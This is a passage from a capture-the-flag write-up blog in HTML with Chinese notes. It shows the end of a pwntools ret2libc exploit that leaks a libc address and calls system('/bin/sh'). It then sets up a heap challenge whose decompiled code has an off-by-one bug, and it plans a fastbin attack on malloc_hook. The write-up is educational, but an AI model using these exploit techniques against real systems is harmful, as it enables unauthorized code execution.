punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome! Press 1 to start the chall.\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000401256</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>pg <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pp <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># pl = 'testing~~~~'</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x11'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tp64<span class=\"token punctuation\">(</span>rdi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pg<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40132F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tp64<span class=\"token punctuation\">(</span><span class=\"token number\">0x850</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4d8</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x310</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x11'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Select the len: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>puts <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x11'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"vspm\"><a class=\"markdownIt-Anchor\" href=\"#vspm\">#</a> VSPM</h3>\n<p>360 points\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tPWN</p>\n<p>Luma 39 solves\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  MEDIUM</p>\n<blockquote>\n<p>I got tired of remembering my passwords… Password managers are so useful!</p>\n</blockquote>\n<p>检查保护:</p>\n<pre><code>[*] '/home/yhuan/Desktop/chall/vspm/chall'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    RUNPATH:  b'.'\n</code></pre>\n<p>经典菜单题目，给的 libc 版本 2.30，但是没有 tcache 机制。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to the Very Secure Password Manager!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"--------------------------------------------\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1. Save new password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. Check my passwords\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. Delete credentials\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. Exit\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Input: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">Delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token function\">Check</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a valid choice :(\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-68h] BYREF</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-64h]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-60h]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-58h]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-50h]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-48h]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-40h]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  __int64 v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+38h] [rbp-38h]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  __int64 v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-30h]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  __int64 v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+48h] [rbp-28h]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  __int64 v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+50h] [rbp-20h]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  __int64 v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+58h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+68h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  v13 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">9</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_4060 <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">==</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No more space to save passwords.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nSelect length: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0x79</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sorry, not enough resources!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  v11 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_4060 <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter credentials: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_4060 <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Name of the credentials: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_4060 <span class=\"token operator\">+</span> <span class=\"token number\">40</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v13<span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有 off by one 漏洞，free 处没漏洞点</p>\n<p>因为没有 tcache 机制，所以可以使用 fastbin attack 攻击 malloc_hook，但是 size 大小被限制，所以需要用 off by one 修改 chunksize，置入 unsortedbin 内，然后堆重叠，修改 fastbin fd 到 malloc_hook-0x23 即可</p>\n<h4 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp:</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td 